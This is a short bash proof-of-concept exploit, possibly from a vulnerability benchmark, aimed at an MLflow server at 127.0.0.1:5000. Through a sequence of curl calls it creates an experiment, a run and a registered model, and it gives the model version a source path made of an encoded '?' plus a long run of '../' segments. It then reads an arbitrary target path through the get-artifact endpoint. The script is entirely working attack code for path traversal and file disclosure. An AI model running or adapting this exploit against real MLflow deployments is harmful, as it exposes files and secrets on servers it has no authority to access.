#!/bin/bash

# Arguments
BASE_URL="http://127.0.0.1:5000"
TARGET_PATH='../../../codebase'

# API URLs
AJAX_API="$BASE_URL/ajax-api/2.0/mlflow"

# Generate unique names
EXPERIMENT_NAME="e_$(openssl rand -hex 4)"
MODEL_NAME="m_$(openssl rand -hex 4)"

# Step 1: Create an experiment
EXP_ID=$(curl -s -X POST -H "Content-Type: application/json" -d '{"name": "'"$EXPERIMENT_NAME"'", "artifact_location": "dbfs:/"}' "$AJAX_API/experiments/create" | jq -r '.experiment_id')

# Step 2: Create a run
RUN_UUID=$(curl -s -X POST -H "Content-Type: application/json" -d '{"experiment_id": "'"$EXP_ID"'"}' "$AJAX_API/runs/create" | jq -r '.run.info.run_uuid')

# Step 3: Upload an artifact to set up the directory structure
curl -s -X POST -F "file=@/dev/null" "$AJAX_API/upload-artifact?run_uuid=$RUN_UUID&path=a?/a"

# Step 4: Create a model and a version with a malicious source path
curl -s -X POST -H "Content-Type: application/json" -d '{"name": "'"$MODEL_NAME"'"}' "$AJAX_API/registered-models/create"
curl -s -X POST -H "Content-Type: application/json" -d '{
    "name": "'"$MODEL_NAME"'",
    "source": "dbfs:/'"$RUN_UUID"'/artifacts/a%3f/../../../../../../../../../../../../"
}' "$AJAX_API/model-versions/create"

# Step 5: Exploit the vulnerability to read the target file
curl -s "$BASE_URL/model-versions/get-artifact?name=$MODEL_NAME&version=1&path=$TARGET_PATH"
